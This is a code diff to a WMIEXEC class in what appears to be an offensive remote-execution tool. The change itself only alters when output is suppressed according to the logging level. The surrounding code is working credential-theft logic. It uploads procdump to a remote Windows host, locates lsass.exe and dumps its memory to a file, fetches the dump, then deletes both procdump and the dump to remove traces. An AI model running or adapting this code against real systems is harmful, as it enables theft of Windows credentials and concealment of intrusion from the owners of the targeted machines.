@@ -90,15 +90,18 @@ class WMIEXEC:
 
             procpath = os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'procdump', 'procdump%s.exe' % (osArch))
             logging.info("%s  Uploading procdump to %s..." % (debugBlue, addr))
-            #with suppress_std():
-            self.shell.do_put(procpath)
+            if logging.getLogger().getEffectiveLevel() > 10:
+                with suppress_std():
+                    self.shell.do_put(procpath)
+            else:
+                self.shell.do_put(procpath)
                 
             
             dt = datetime.now().strftime("%m-%d-%Y_%H-%M-%S")
 
             cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do procdump{}.exe -accepteula -ma ^%B C:\\{}.dmp""".format(osArch, addr + "_" + dt)
             logging.info("%s  Executing procdump on %s..." % (debugBlue, addr))
-            if logging.getLogger().getEffectiveLevel() >= 30:
+            if logging.getLogger().getEffectiveLevel() > 10:
                 with suppress_std():
                     self.shell.onecmd(cmd)
             else:
@@ -118,11 +121,17 @@ class WMIEXEC:
             dump.close()
 
             logging.info("%s  Deleting procdump on %s..." % (debugBlue, addr))
-            with suppress_std():
+            if logging.getLogger().getEffectiveLevel() > 10:
+                with suppress_std():
+                    self.shell.onecmd("del procdump%s.exe" % (osArch))
+            else:
                 self.shell.onecmd("del procdump%s.exe" % (osArch))
 
             logging.info("%s  Deleting dump on %s..." % (debugBlue, addr))
-            with suppress_std():
+            if logging.getLogger().getEffectiveLevel() > 10:
+                with suppress_std():
+                    self.shell.onecmd("del %s.dmp" % (addr + "_" + dt))
+            else:
                 self.shell.onecmd("del %s.dmp" % (addr + "_" + dt))
 
             if self.__smbConnection is not None:
